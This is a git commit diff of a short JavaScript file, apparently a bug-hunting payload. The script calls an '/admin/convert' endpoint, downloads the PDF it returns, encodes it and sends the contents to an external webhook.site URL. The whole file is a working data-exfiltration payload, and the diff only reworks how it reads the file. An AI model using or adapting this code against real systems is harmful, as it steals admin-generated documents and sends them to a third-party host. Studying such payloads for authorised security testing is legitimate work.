3e7a48a0b415d2224cde23ee8760f4483d6e7ac0
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-04-29 16:02:13 +0530

    Update and rename read-md1.js to read-md0.js

--- read-md0.js
+++ read-md0.js
@@ -1,32 +1,27 @@
-const htmlCode = "xx";
+const htmlCode = "xxx";
 const xhr = new XMLHttpRequest();
 xhr.open("POST", "/admin/convert");
 xhr.setRequestHeader("Content-Type", "application/json");
-xhr.timeout = 3000; // Set a timeout of 3 seconds
 xhr.onload = function() {
   if (xhr.status === 200) {
     const response = JSON.parse(xhr.responseText);
     const pdfLink = response.pdfLink;
     const encpdflink = encodeURIComponent(pdfLink);
-
     const pdfRequest = new XMLHttpRequest();
     pdfRequest.open("GET", pdfLink);
     pdfRequest.responseType = "blob";
-    pdfRequest.timeout = 3000; // Set a timeout of 3 seconds
-    pdfRequest.onload = async function() {
+    pdfRequest.onload = function() {
       if (pdfRequest.status === 200) {
         const blob = pdfRequest.response;
-        const pdfContent = await new Promise((resolve) => {
-          const reader = new FileReader();
-          reader.onload = () => resolve(reader.result);
-          reader.readAsDataURL(blob);
-        });
-
-        const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(pdfContent)}`;
-        const webhookRequest = new XMLHttpRequest();
-        webhookRequest.open("GET", webhookUrl);
-        webhookRequest.timeout = 3000; // Set a timeout of 3 seconds
-        webhookRequest.send();
+        const reader = new FileReader();
+        reader.onload = function() {
+          const pdfContent = encodeURIComponent(reader.result);
+          const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${encodeURIComponent(reader.result)}`;
+          const webhookRequest = new XMLHttpRequest();
+          webhookRequest.open("GET", webhookUrl);
+          webhookRequest.send();
+        };
+        reader.readAsDataURL(blob);
       }
     };
     pdfRequest.onerror = function() {
